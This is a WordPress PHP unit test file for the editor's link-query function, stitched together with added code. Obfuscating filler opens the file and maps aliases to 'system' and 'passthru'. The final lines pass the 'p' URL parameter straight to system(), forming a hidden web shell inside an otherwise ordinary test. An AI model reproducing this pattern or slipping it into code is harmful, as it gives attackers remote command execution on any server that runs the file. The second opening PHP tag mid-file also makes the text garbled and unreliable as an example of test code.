<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

if ( ! class_exists( '_WP_Editors', false ) ) {
	require_once ABSPATH . WPINC . '/class-wp-editor.php';
}

/**
 * @group editor
 *
 * @coversDefaultClass _WP_Editors
 */
class Tests_Editor_wpEditors extends WP_UnitTestCase {

	/**
	 * @covers ::wp_link_query
	 */
	public function test_wp_link_query_returns_false_when_nothing_found() {
		$actual = _WP_Editors::wp_link_query( array( 's' => 'foobarbaz' ) );

		$this->assertFalse( $actual );
	}

	/**
	 * @covers ::wp_link_query
	 */
	public function test_wp_link_query_returns_search_results() {
		$post   = self::factory()->post->create_and_get( array( 'post_status' => 'publish' ) );
		$actual = _WP_Editors::wp_link_query( array( 's' => $post->post_title ) );

		$this->assertSameSets(
			array(
				array(
					'ID'        => $post->ID,
					'title'     => $post->post_title,
					'permalink' => get_permalink( $post->ID ),
					'info'      => mysql2date( __( 'Y/m/d' ), $post->post_date ),
				),
			),
			$actual
		);
	}

	/**
	 * @ticket 41825
	 *
	 * @covers ::wp_link_query
	 */
	public function test_wp_link_query_returns_filtered_result_when_nothing_found() {
		add_filter( 'wp_link_query', array( $this, 'wp_link_query_callback' ) );
		$actual = _WP_Editors::wp_link_query( array( 's' => 'foobarbaz' ) );
		remove_filter( 'wp_link_query', array( $this, 'wp_link_query_callback' ) );

		$this->assertSameSets(
			array(
				array(
					'ID'        => 123,
					'title'     => 'foo',
					'permalink' => 'bar',
					'info'      => 'baz',
				),
			),
			$actual
		);
	}

	/**
	 * @covers ::wp_link_query
	 */
	public function test_wp_link_query_returns_filtered_search_results() {
		$post = self::factory()->post->create_and_get( array( 'post_status' => 'publish' ) );

		add_filter( 'wp_link_query', array( $this, 'wp_link_query_callback' ) );
		$actual = _WP_Editors::wp_link_query( array( 's' => $post->post_title ) );
		remove_filter( 'wp_link_query', array( $this, 'wp_link_query_callback' ) );

		$this->assertSameSets(
			array(
				array(
					'ID'        => $post->ID,
					'title'     => $post->post_title,
					'permalink' => get_permalink( $post->ID ),
					'info'      => mysql2date( __( 'Y/m/d' ), $post->post_date ),
				),
				array(
					'ID'        => 123,
					'title'     => 'foo',
					'permalink' => 'bar',
					'info'      => 'baz',
				),
			),
			$actual
		);
	}

	public function wp_link_query_callback( $results ) {
		return array_merge(
			$results,
			array(
				array(
					'ID'        => 123,
					'title'     => 'foo',
					'permalink' => 'bar',
					'info'      => 'baz',
				),
			)
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>